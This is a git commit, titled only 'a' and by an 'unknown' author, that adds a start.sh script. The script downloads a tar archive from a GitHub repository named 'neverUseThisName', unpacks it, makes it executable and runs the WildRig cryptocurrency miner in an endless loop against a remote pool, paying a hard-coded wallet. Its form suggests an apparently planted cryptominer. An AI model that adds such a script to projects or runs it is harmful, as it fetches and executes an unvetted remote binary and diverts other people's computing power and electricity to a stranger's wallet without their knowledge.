692c05fcc7d226901db07f85f22d6baede715659
unknown <fzhuolin@gmail.com>
2026-09-21 08:23:44 +0800

    a

---
+++ start.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+wget https://github.com/neverUseThisName/wildrig/raw/refs/heads/main/wildrig-multi.tar
+tar -xf wildrig-multi.tar
+chmod +x wildrig-multi
+while true
+do
+./wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1phhxw952uk6s3vg9a8afaumm4e6hmc5ff4qzyhm2ht22n7rpmnqgs38dcjc --worker test
+sleep 5
+done
